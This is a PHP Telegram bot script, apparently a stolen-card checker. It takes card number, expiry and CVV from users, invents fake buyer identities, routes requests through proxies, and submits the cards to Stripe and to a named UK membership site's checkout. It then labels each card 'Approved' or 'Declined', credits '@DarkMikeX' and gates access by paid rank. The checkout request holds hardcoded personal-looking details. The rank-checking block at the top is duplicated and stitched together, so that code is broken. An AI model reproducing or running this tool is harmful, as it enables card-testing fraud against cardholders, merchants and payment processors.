<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "FREE";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/fel|\.fel|!fel)/', $text)) {
    $userid = $update['message']['from']['id'];

$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>♤ Wrong Format! ⚠️</b>%0A♤USAGE: <code>/ccn cc|mm|yy|cvv</code>%0A♤GATE-WAY: <code>Stripe Ccn $0.5 %0A♤CREATED: [2024-03-23]</code>', $message_id);
            exit();
  }

//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>

Waiting For results...

</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

Waiting For results....

</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

Waiting For results...

</b>");


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
   //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A/N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

Waiting For results...

</b>");
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.7';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS,   'type=card&billing_details[address][line1]=4821+Ridge+Top+Cir&billing_details[address][line2]=&billing_details[address][city]=Anchorage&billing_details[address][state]=AK&billing_details[address][postal_code]=99508&billing_details[address][country]=US&billing_details[name]=Min+ThantKiove&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=541faa31-7e26-43b8-9896-5b3feb4e2c7b21149d&muid=f3e07e79-85d5-4bfc-9851-d4e924f10341c812a7&sid=392c1bb2-3225-491e-b1c2-ebbb027bf4ba6a5927&pasted_fields=number&payment_user_agent=stripe.js%2F5b3940e88a%3B+stripe-js-v3%2F5b3940e88a%3B+split-card-element&referrer=https%3A%2F%2Fwww.iafar.co.uk&time_on_page=51811&key=pk_live_8zWq8sKBzNFeiLIzmAKQKrVH');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

//==================req 1 end===============//
//==================req 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.iafar.co.uk/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
'authority: www.iafar.co.uk',
'method: POST',
'path: /membership-account/membership-checkout/',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.7',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryoJUhdarupXTwNh4n',
'cookie: PHPSESSID=ur3dci97qacbu905lr4sv5838n; pmpro_visit=1; newsletter_popup=true; __stripe_mid=f3e07e79-85d5-4bfc-9851-d4e924f10341c812a7; __stripe_sid=392c1bb2-3225-491e-b1c2-ebbb027bf4ba6a5927',
'origin: https://www.iafar.co.uk',
'referer: https://www.iafar.co.uk/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
);


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="level"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="checkjavascript"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="other_discount_code"


------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="username"

MinThantKiove
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="password"

Inmysky@90
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="password2"

Inmysky@90
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bemail"

Daemon979@gmail.com
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bconfirmemail"

Daemon979@gmail.com
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="fullname"


------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="full_name"

Minthantkiove
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="university"

united states
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="universitydoc"; 

------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="universityenddate[m]"

12
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="universityenddate[d]"

12
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="universityenddate[y]"

2000
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="phone"

+1 831 756 8311
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="personal_address1"

4821 Ridge Top Cir
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="personal_address2"


------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="personal_county"

Alaska
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="personal_postcode"

99508
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="personal_country"

Anchorage
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="interestedin_checkbox[]"

education
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="interestedin_checkbox[]"

advocacy
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="interestedin[]"

community
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="interestedin_checkbox[]"

community
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="issues"

Thank You
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="iwould[]"

committee
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="iwould_checkbox[]"

committee
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="iwould_checkbox[]"

outreach
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="iwould_checkbox[]"

nothing
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="gateway"

stripe
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bfirstname"

Min
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="blastname"

ThantKiove
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="baddress1"

4821 Ridge Top Cir
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="baddress2"


------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bcity"

Anchorage
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bstate"

AK
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bzipcode"

99508
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bcountry"

US
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="bphone"

(831) 756-8311
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="CardType"

visa
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="discount_code"


------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="submit-checkout"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="javascriptok"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="submit-checkout"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="javascriptok"

1
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="payment_method_id"

'.$id.'
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="AccountNumber"

XXXXXXXXXXXX6618
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="ExpirationMonth"

02
------WebKitFormBoundaryoJUhdarupXTwNh4n
Content-Disposition: form-data; name="ExpirationYear"

2028
------WebKitFormBoundaryoJUhdarupXTwNh4n--');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

//==================req 2 end===============//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

Waiting For results...

</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//


if (
    strpos($result2, 'Thank you for your membership.') !== false ||
    strpos($result2, "Membership Confirmation") !== false ||
    strpos($result2, "Thank You For Donation.") !== false ||
    strpos($result2, "Success ") !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, "/donations/thank_you?donation_number=") !== false
) {
  $resp = "
Card -» $lista
Status -» Approved ✅
Result -» Membership Confirmation.
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️
";
sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, "insufficient_funds") !== false ||
    strpos($result2, "Your card has insufficient funds.") !== false ||
    strpos($result2, '"status":"success"') !== false
) {
$resp = "
Card -» $lista
Status -» Approved ✅
Result -» Insufficient funds
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif (
    strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
    strpos($result2, "Your card does not support this type of purchase.") !== false ||
    strpos($result2, 'transaction_not_allowed') !== false
) {
$resp = "
Card -» $lista
Status -» Approved ✅
Result -» Your card does not support this type of purchase.
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, 'Your card zip code is incorrect.') !== false
) {
$resp = "
Card -» $lista
Status -» Approved ✅
Result -» Your card does not support this type of purchase.
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, "stripe_3ds2_fingerprint") !== false
) {
$resp = "
Card -» $lista
Status -» Approved ✅
Result -» Security Access [3Ds].
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif (
    strpos($result2, 'security code is incorrect.') !== false ||
    strpos($result2, 'security code is invalid.') !== false ||
    strpos($result2, "incorrect_cvc") !== false
) {
$resp = "
Card -» $lista
Status -» Approved ✅
Result -» Card Security Code Is Incorrect.
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
$resp = "
Card -» $lista
Status -» $msg
Result -» Card Declined ❌
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

  ";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
$resp = "
Card -» $lista
Status -» $msg
Result -» Card Declined ❌
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

else {
$resp = "
Card -» $lista
Status -» $msg
Result -» Card Declined ❌
Gateway -» Felix $1
——-—»Details«—-——
Bin -» $type - $brand - $scheme
Bank -» $bank
Country -» $country $emoji
———-»Info«-———-
Time taken -» $time
Proxy -» Live! ✅
Checked by -» @$username [$rank]
Bot by --» @DarkMikeX☃️

  ";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}
